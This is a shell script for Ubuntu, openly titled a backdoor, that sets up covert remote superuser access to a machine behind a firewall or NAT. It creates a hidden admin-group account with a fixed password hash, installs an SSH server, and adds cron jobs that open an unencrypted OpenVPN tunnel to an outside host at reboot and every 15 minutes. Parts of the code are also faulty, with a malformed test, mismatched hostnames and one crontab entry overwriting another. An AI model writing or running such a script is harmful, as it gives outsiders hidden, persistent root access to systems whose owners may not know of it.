#! /bin/sh
# Backdoor,  By sacarlson aka Scott Carlson sacarlson@ipipi.com
# this is writen for ubuntu but may also work on other debian dirivitives.
# This will create a back door or method to get into a system that is behind a firewall or NATed network.
# it will setup an openvpn unencrypted tunnel to freenet.surething.bz at each reboot of the system.
# it will install an ssh server to enable shell access from the internet from freenet
# it will also setup a back door sudo account so that admin of freenet can login as a superuser.
# note that the server side must run:
# sudo openvpn --dev tun0 --ifconfig 10.2.2.3 10.2.2.2
# and ssh freenet@10.2.2.2   pass: low security normal
# to open the tun0 port to target
# note: before you run this on new installed system you should do two lines bellow:
# added check for openvpn running every 15 minits and if not start it.  might help for wifi when not started at boot
sudo apt-get update
sudo apt-key update
sudo dpkg --configure -a

sudo /bin/egrep -i "freenet" /etc/passwd
if [$? -eq 0 ]; then
  echo "User freenet already exists, skip useradd"
else
  echo "no freenet account so will useradd it now"
  #this will make the password the same as freenet
  # the aadded -r should make the usre invisible
  sudo useradd -r -d /home/freenet -g admin -m -p '$6$Gq0omSOk$TJARd2D.OwTXKs2/er.YVZZr1e6v.b6H9pXdDbY1bEUNS8psc33vckGY4KerkNc5T5VIUGJCOyTUWpjMfkRYq0' freenet
  #sudo useradd -d /home/freenet -g admin -m -p '$6$Gq0omSOk$TJARd2D.OwTXKs2/er.YVZZr1e6v.b6H9pXdDbY1bEUNS8psc33vckGY4KerkNc5T5VIUGJCOyTUWpjMfkRYq0' freenet
fi
 
sleep 2
sudo apt-get -y install openssh-server
sudo apt-get -y install openvpn
# note change freenet.surething.biz if you want the openvpn to point some other place
echo "@reboot  /usr/sbin/openvpn --remote freenet.surething.biz --dev tun0  --ifconfig 10.2.2.2 10.2.2.3  >/dev/null 2>&1" | sudo crontab -

#seems @reboot it won't always start since I guess if they aren't connected to net a boot (example wifi) it won't work
# so to fix this I created another cron every 15 minits to check if openvpn is running and if not start it

filename="/home/freenet/openvpn_client.sh"
if [ -e $filename ]
then
  echo "$filename exists nothing more will be done"
  exit 1
fi 
echo "$filename not found will create one"


sudo echo '#! /bin/sh' > $filename
sudo echo ' if [ "$(pidof openvpn)" ] ' >> $filename
sudo echo ' then ' >> $filename
sudo echo '  echo "openvpn is running nothing done" ' >> $filename
sudo echo ' else ' >> $filename
sudo echo '  echo "openvpn is not running will start now" ' >> $filename
sudo echo '  sudo /usr/sbin/openvpn --remote freenet.surething.biz --dev tun0  --ifconfig 10.2.2.2 10.2.2.3 ' >> $filename
sudo echo ' fi ' >> $filename

sudo chmod +x $filename

echo "*/15 * * * * $filename  >/dev/null 2>&1" | sudo crontab -

echo "backdoor.sh install completed, will now start openvpn"
# lets also start it now
sudo /usr/sbin/openvpn --remote freenet.surething.biz --dev tun0  --ifconfig 10.2.2.2 10.2.2.3

